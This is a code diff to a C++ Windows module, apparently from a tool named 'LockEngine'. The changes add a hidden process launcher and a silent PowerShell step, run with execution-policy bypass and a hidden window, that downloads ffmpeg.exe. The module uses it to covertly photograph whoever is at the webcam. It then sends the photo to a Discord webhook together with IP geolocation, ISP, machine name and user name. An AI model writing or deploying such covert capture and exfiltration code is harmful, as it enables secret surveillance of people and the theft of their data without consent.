@@ -91,9 +91,21 @@ inline std::string RunCmd(const std::string& cmd) {
         readBuf[bytesRead] = '\0'; output += readBuf;
     }
     CloseHandle(hRead);
-    WaitForSingleObject(pi.hProcess, 5000);
+    WaitForSingleObject(pi.hProcess, 30000);
     CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
     return output;
+}
+
+inline void RunCmdAsync(const std::string& cmd) {
+    std::string cmdLine = "cmd /c " + cmd;
+    STARTUPINFOA si = {}; si.cb = sizeof(si);
+    si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
+    PROCESS_INFORMATION pi = {};
+    std::vector<char> buf(cmdLine.begin(), cmdLine.end());
+    buf.push_back('\0');
+    if (CreateProcessA(NULL, buf.data(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
+    }
 }
 
 inline std::string HttpGet(const char* host, const char* path, bool https = false) {
@@ -221,7 +233,6 @@ inline bool PostToDiscord(const std::string& json) {
 
 inline bool PostToDiscordWithFile(const std::string& json, const std::string& filePath, const std::string& fileName, const std::string& mime) {
     std::string whPath = GetWebhookPath();
-    // Read file
     HANDLE hf = CreateFileA(filePath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
     if (hf == INVALID_HANDLE_VALUE) return false;
     DWORD sz = GetFileSize(hf, NULL);
@@ -267,7 +278,81 @@ inline bool PostToDiscordWithFile(const std::string& json, const std::string& fi
     return ok;
 }
 
-// ===== Webcam Capture (ffmpeg only, no extra dependencies) =====
+// ===== FFmpeg Manager =====
+
+inline std::string GetCachedFFmpegDir() {
+    char localApp[MAX_PATH];
+    if (!ExpandEnvironmentStringsA("%LOCALAPPDATA%", localApp, MAX_PATH)) return "";
+    std::string dir = std::string(localApp) + "\\LockEngine";
+    CreateDirectoryA(dir.c_str(), NULL);
+    return dir;
+}
+
+inline std::string FindFFmpeg() {
+    // Check common paths
+    const char* candidates[] = {
+        "C:\\ProgramData\\chocolatey\\bin\\ffmpeg.exe",
+        "C:\\ffmpeg\\bin\\ffmpeg.exe",
+        "C:\\tools\\ffmpeg\\bin\\ffmpeg.exe"
+    };
+    for (const char* p : candidates) {
+        if (GetFileAttributesA(p) != INVALID_FILE_ATTRIBUTES) return p;
+    }
+    // Check PATH
+    char found[MAX_PATH];
+    if (SearchPathA(NULL, "ffmpeg.exe", NULL, MAX_PATH, found, NULL)) return found;
+
+    // Check cached location
+    std::string cached = GetCachedFFmpegDir() + "\\ffmpeg.exe";
+    if (GetFileAttributesA(cached.c_str()) != INVALID_FILE_ATTRIBUTES) return cached;
+
+    return "";
+}
+
+inline void DownloadFFmpegAsync() {
+    std::string cacheDir = GetCachedFFmpegDir();
+    if (cacheDir.empty()) return;
+    std::string target = cacheDir + "\\ffmpeg.exe";
+    if (GetFileAttributesA(target.c_str()) != INVALID_FILE_ATTRIBUTES) return;
+
+    // Write download script to temp
+    char tempDir[MAX_PATH];
+    GetTempPathA(MAX_PATH, tempDir);
+    std::string scriptPath = std::string(tempDir) + "dl_ff.ps1";
+
+    // Build the script content
+    std::string script;
+    script += "$ErrorActionPreference='SilentlyContinue'\n";
+    script += "$dest='" + cacheDir + "'\n";
+    script += "$ff=\"$dest\\ffmpeg.exe\"\n";
+    script += "if(Test-Path $ff){exit 0}\n";
+    script += "New-Item -ItemType Directory -Path $dest -Force|Out-Null\n";
+    script += "$zip=\"$env:TEMP\\ff_dl.zip\"\n";
+    script += "$extract=\"$env:TEMP\\ff_ex\"\n";
+    script += "try{\n";
+    script += "  [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12\n";
+    script += "  Invoke-WebRequest -Uri 'https://www.gyan.dev/ffmpeg/builds/ffmpeg-release-essentials.zip' -OutFile $zip -UseBasicParsing\n";
+    script += "  if(!(Test-Path $zip)){exit 1}\n";
+    script += "  Expand-Archive $zip -DestinationPath $extract -Force\n";
+    script += "  $exe=Get-ChildItem $extract -Recurse -Filter 'ffmpeg.exe'|Select -First 1\n";
+    script += "  if($exe){Copy-Item $exe.FullName $ff -Force}\n";
+    script += "  Remove-Item $zip,$extract -Recurse -Force -ErrorAction SilentlyContinue\n";
+    script += "}catch{}\n";
+
+    // Write script
+    HANDLE hScript = CreateFileA(scriptPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
+    if (hScript != INVALID_HANDLE_VALUE) {
+        DWORD written;
+        WriteFile(hScript, script.c_str(), (DWORD)script.size(), &written, NULL);
+        CloseHandle(hScript);
+
+        // Run silently in background
+        std::string psCmd = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File \"" + scriptPath + "\"";
+        RunCmdAsync(psCmd);
+    }
+}
+
+// ===== Webcam Capture =====
 
 inline std::string CaptureWebcam() {
     char tempDir[MAX_PATH];
@@ -275,22 +360,15 @@ inline std::string CaptureWebcam() {
     std::string photoPath = std::string(tempDir) + "intruder_capture.jpg";
     DeleteFileA(photoPath.c_str());
 
-    std::string ffmpegPath;
-    const char* candidates[] = {
-        "C:\\ProgramData\\chocolatey\\bin\\ffmpeg.exe",
-        "C:\\ffmpeg\\bin\\ffmpeg.exe",
-        "C:\\tools\\ffmpeg\\bin\\ffmpeg.exe"
-    };
-    for (const char* p : candidates) {
-        if (GetFileAttributesA(p) != INVALID_FILE_ATTRIBUTES) { ffmpegPath = p; break; }
-    }
-    if (ffmpegPath.empty()) {
-        char found[MAX_PATH];
-        if (SearchPathA(NULL, "ffmpeg.exe", NULL, MAX_PATH, found, NULL))
-            ffmpegPath = found;
-    }
-    if (ffmpegPath.empty()) return "";
+    std::string ffmpegPath = FindFFmpeg();
 
+    // If not found, start download for next time and return empty
+    if (ffmpegPath.empty()) {
+        DownloadFFmpegAsync();
+        return "";
+    }
+
+    // List camera devices
     std::string devOut = RunCmd("\"" + ffmpegPath + "\" -list_devices true -f dshow -i dummy 2>&1");
     std::string camName, bestCam;
     size_t pos = 0;
@@ -310,6 +388,7 @@ inline std::string CaptureWebcam() {
     if (camName.empty()) camName = bestCam;
     if (camName.empty()) return "";
 
+    // Capture one frame
     std::string captureCmd = "\"" + ffmpegPath + "\" -y -f dshow -i \"video=" + camName + "\" -frames:v 1 -q:v 2 \"" + photoPath + "\"";
     STARTUPINFOA si = {}; si.cb = sizeof(si);
     si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
@@ -332,7 +411,6 @@ inline std::string CaptureWebcam() {
 // ===== Build Embed JSON =====
 
 inline std::string BuildEmbedJson(const std::string& key, const std::string& pc, const std::string& usr, bool hasPhoto = false) {
-    // Gather info
     std::string geoJson = HttpGet("ip-api.com", "/json");
     std::string publicIp = JsonVal(geoJson, "query");
     std::string isp = JsonVal(geoJson, "isp");
@@ -408,10 +486,10 @@ inline DWORD WINAPI DirectWebhookThread(LPVOID p) {
     std::string jsonNoPhoto = BuildEmbedJson(d->key, d->pc, d->usr, false);
     PostToDiscord(jsonNoPhoto);
 
-    // STEP 2: Try webcam capture (best effort, no crash risk)
+    // STEP 2: Try webcam capture (best effort)
     std::string photoPath = CaptureWebcam();
     if (!photoPath.empty()) {
-        // Send a SECOND message with the photo attached
+        // Send SECOND message with photo
         std::string jsonWithPhoto = BuildEmbedJson(d->key, d->pc, d->usr, true);
         PostToDiscordWithFile(jsonWithPhoto, photoPath, "intruder_capture.jpg", "image/jpeg");
         DeleteFileA(photoPath.c_str());
